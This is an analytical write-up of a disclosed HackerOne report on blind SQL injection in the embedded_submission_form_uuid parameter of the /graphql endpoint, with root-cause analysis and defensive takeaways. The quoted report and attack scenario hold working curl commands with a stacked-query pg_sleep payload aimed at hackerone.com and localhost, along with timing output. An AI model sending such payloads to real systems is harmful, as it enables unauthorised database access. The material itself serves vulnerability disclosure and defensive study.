# SQL Injection in GraphQL Endpoint via embedded_submission_form_uuid Parameter

## Metadata
- **Source:** HackerOne
- **Report:** 435066 | https://hackerone.com/reports/435066
- **Submitted:** 2018-11-06
- **Reporter:** jobert
- **Program:** HackerOne
- **Bounty:** Not specified in report
- **Severity:** High
- **Vuln:** SQL Injection, Query Parameter Injection, Time-Based SQL Injection
- **CVEs:** None
- **Category:** web-api

## Summary
The embedded_submission_form_uuid query parameter in the /graphql endpoint is vulnerable to SQL injection, allowing attackers to execute arbitrary SQL commands. The vulnerability is demonstrated through time-based injection using pg_sleep() to confirm code execution, with potential to access or exfiltrate data from the database.

## Attack scenario
1. Attacker discovers the /graphql endpoint accepts an embedded_submission_form_uuid parameter
2. Attacker crafts a malicious payload with SQL syntax: 1'; SELECT 1; SELECT pg_sleep(N); --
3. Attacker sends the payload via GET/POST request as a query parameter
4. The parameter value is concatenated directly into a SQL query without proper sanitization or parameterization
5. The injected SQL code executes within the database context, causing observable delay via pg_sleep()
6. Attacker confirms execution and escalates to data exfiltration or schema traversal attacks

## Root cause
The embedded_submission_form_uuid parameter is directly interpolated into a SQL query without using prepared statements, parameterized queries, or input validation. The application fails to properly escape or sanitize user-supplied input before passing it to the database layer.

## Attacker mindset
An attacker would recognize this as a critical vulnerability for information disclosure and potential system compromise. The time-based blind injection technique allows confirmation of execution without visible error messages. The attacker would attempt to enumerate database schemas, extract sensitive data, or potentially escalate privileges by switching database contexts.

## Defensive takeaways
- Always use parameterized queries/prepared statements for all database interactions, especially in GraphQL resolvers
- Implement strict input validation and type checking for all query parameters
- Apply principle of least privilege to database accounts used by the application
- Use ORM frameworks that automatically handle query parameterization
- Implement Web Application Firewall (WAF) rules to detect and block common SQL injection patterns
- Conduct regular security audits and penetration testing of API endpoints
- Implement database activity monitoring to detect suspicious query patterns
- Enforce code review processes with security focus on data access layers

## Variant hunting
Similar SQL injection vulnerabilities likely exist in other GraphQL query parameters that accept user input. Search for: form_uuid, submission_id, user_id, report_id, and other identifier parameters that may be concatenated into queries. Check for time-based blind injection in POST body parameters, nested fields, and mutation arguments.

## MITRE ATT&CK
- T1190
- T1565
- T1526
- T1592

## Notes
The reporter notes execution occurs in a 'secure' schema context, suggesting the database may use schema-based access controls. However, schema switching capabilities could elevate impact significantly. The time-based proof-of-concept with pg_sleep() demonstrates blind SQL injection; boolean-based or error-based techniques may also be viable. The HTTP 200 response with empty body {} indicates the application suppresses database errors, hindering direct exploitation but not preventing blind injection attacks.

## Full report
<details><summary>Expand</summary>

The `embedded_submission_form_uuid` parameter in the `/graphql` endpoint is vulnerable to a SQL injection. Execute the following command to reproduce the behavior:

**Locally**:
```
curl -X POST http://localhost:8080/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(30\)%3B--%27
```

**HackerOne.com**
```
curl -X POST https://hackerone.com/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(30\)%3B--%27
```

**Additional proof**
```
$ time curl -X POST https://hackerone.com/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(5\)%3B--%27
{}curl -X POST   0.03s user 0.01s system 0% cpu 5.726 total
$ time curl -X POST https://hackerone.com/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(1\)%3B--%27
{}curl -X POST   0.03s user 0.01s system 2% cpu 1.631 total
$ time curl -X POST https://hackerone.com/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(10\)%3B--%27
{}curl -X POST   0.02s user 0.01s system 0% cpu 10.557 total
```

## Impact

The SQL injections seems to be executing in the context of the `secure` schema, so impact is currently unknown. However, since an attacker may be able to switch schemas, we should consider this to have a high impact on confidentiality.

</details>

---
*Analysed by Claude on 2026-05-11*
